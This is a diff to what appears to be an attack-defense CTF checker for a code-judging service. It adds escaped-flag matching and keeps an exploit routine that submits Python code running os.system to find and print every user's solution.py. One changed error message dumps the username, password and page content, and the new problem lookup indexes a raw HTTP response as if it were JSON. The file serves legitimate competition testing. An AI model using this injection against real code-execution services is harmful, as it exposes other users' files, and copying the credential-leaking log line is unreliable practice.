@@ -238,7 +238,8 @@ async def getflag_drafts(
     
     content = response.text
     
-    if task.flag not in content:
+    escaped_flag = task.flag.replace('/', r'\/')
+    if task.flag not in content and escaped_flag not in content:
         raise MumbleException("Flag was not found in the drafts content")
     
 @checker.getflag(1)
@@ -261,8 +262,9 @@ async def getflag_solutions(
     
     content = response.text
 
-    if task.flag not in content:
-        raise MumbleException("Flag was not found in the problem content")
+    escaped_flag = task.flag.replace('/', r'\/')
+    if task.flag not in content and escaped_flag not in content:
+        raise MumbleException(f"Flag was not found in the problem content: username: {username}, password: {password}, problem_id: {problem_id}, content: {content}, escaped_flag: {escaped_flag}")
     
 @checker.getflag(2)
 async def getflag_feedback(
@@ -284,7 +286,9 @@ async def getflag_feedback(
     
     content = response.text
 
-    if task.flag not in content:
+
+    escaped_flag = task.flag.replace('/', r'\/')
+    if task.flag not in content and escaped_flag not in content:
         raise MumbleException("Flag was not found in the feedback content")
     
 
@@ -338,13 +342,15 @@ async def exploit_solutions(task: ExploitCheckerTaskMessage,
     conn = Connection(logger, client)
     await conn.register_user(username, password)
     await conn.login_user(username, password)
+
+    problems = await conn.client.post("/api/problems")
     
     exploit_script = """import os
 os.system('find submissions -type f -name "solution.py" | while read -r file; do echo "===== $file ====="; cat "$file"; echo; done')
 """
 
     response = await conn.client.post(
-        "/problems/details/1/submit",
+        f"/problems/details/{problems[0]['id']}/submit",
         data={"code": exploit_script}
     )
 
@@ -353,7 +359,8 @@ os.system('find submissions -type f -name "solution.py" | while read -r file; do
     
     data = response.text
 
-    if task.flag not in data:
+    escaped_flag = task.flag.replace('/', r'\/')
+    if task.flag not in data and escaped_flag not in data:
         raise MumbleException("Flag was not found in the exploit output")
     
     return task.flag
